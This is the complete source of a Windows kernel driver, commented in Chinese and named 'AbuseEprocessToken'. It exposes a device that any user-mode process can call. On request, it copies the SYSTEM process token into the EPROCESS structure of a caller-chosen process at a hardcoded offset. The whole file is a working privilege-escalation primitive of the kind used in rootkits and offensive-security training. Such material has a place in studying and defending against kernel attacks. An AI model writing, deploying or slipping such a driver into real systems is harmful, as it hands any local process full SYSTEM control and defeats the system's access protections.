#include <ntifs.h>

#define SYMLINK_NAME L"\\??\\AbuseEprocessToken"
#define DEVICE_NAME L"\\device\\AbuseEprocessToken"
#define ABUSE_EPROCESS_TOKEN CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

PDEVICE_OBJECT pDevice;

NTSTATUS Dispatcher(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
    ULONG inputBufferLength = 0;
    ULONG outputBufferLength = 0;
    ULONG ioControlCode = 0;
    PEPROCESS pEprocess = NULL;
    PIO_STACK_LOCATION ioStackLocation = IoGetCurrentIrpStackLocation(pIrp);
    if (pDeviceObject != pDevice)
    {
        return STATUS_UNSUCCESSFUL;
    }

    // 根據 IRP 做對應的處理
    switch (ioStackLocation->MajorFunction)
    {
        case IRP_MJ_DEVICE_CONTROL:
            // 取得從應用程式傳來的資料
            inputBufferLength = ioStackLocation->Parameters.DeviceIoControl.InputBufferLength;
            outputBufferLength = ioStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
            ioControlCode = ioStackLocation->Parameters.DeviceIoControl.IoControlCode;
            HANDLE processId = *(HANDLE *)pIrp->AssociatedIrp.SystemBuffer;

            // 根據 IoControlCode 做對應處理
            switch (ioControlCode)
            {
                case ABUSE_EPROCESS_TOKEN:
                    // 取得 System (pid 4) 的 EPROCESS Token
                    PsLookupProcessByProcessId((HANDLE)4, &pEprocess);
                    DWORD64 systemToken = *(DWORD64 *)((DWORD64)pEprocess + 0x358);

                    // 把從應用程式傳來的 pid 的 EPROCESS Token 竄改成 System 的 EPROCESS Token
                    PsLookupProcessByProcessId(processId, &pEprocess);
                    *(DWORD64 *)((DWORD64)pEprocess + 0x358) = systemToken;
                    break;
                default:
                    break;
            }
            break;
        default:
            break;
    }

    pIrp->IoStatus.Status = STATUS_SUCCESS;
    pIrp->IoStatus.Information = outputBufferLength;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS CreateDevice(PDRIVER_OBJECT pDriverObject)
{
    NTSTATUS status;
    UNICODE_STRING deviceName;
    UNICODE_STRING symLinkName;
    RtlInitUnicodeString(&deviceName, DEVICE_NAME);
    RtlInitUnicodeString(&symLinkName, SYMLINK_NAME);

    // 建立一個 Device
    status = IoCreateDevice(pDriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, 1, &pDevice);
    if (NT_SUCCESS(status))
    {
        pDriverObject->DeviceObject = pDevice;

        // 建立一個 Symbolic Link 連結到這個 Device
        status = IoCreateSymbolicLink(&symLinkName, &deviceName);
    }
    return status;
}

VOID DriverUnload(PDRIVER_OBJECT pDriverObject)
{
    UNICODE_STRING symLinkName;
    RtlInitUnicodeString(&symLinkName, SYMLINK_NAME);

    // 在卸載時刪除之前建立的 Device 與 Symbolic Link
    IoDeleteSymbolicLink(&symLinkName);
    IoDeleteDevice(pDriverObject->DeviceObject);
}

extern NTSTATUS DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING registryPath)
{
    UNREFERENCED_PARAMETER(registryPath);
    NTSTATUS status = STATUS_SUCCESS;

    // 要設定卸載函數驅動程式才能順利卸載
    driverObject->DriverUnload = DriverUnload;

    // 建立 Device 與對應的 Symbolic Link
    status = CreateDevice(driverObject);

    // 為需要用到的 IRP 定義處理函數
    driverObject->MajorFunction[IRP_MJ_CREATE] = Dispatcher;
    driverObject->MajorFunction[IRP_MJ_CLOSE] = Dispatcher;
    driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = Dispatcher;

    return STATUS_SUCCESS;
}
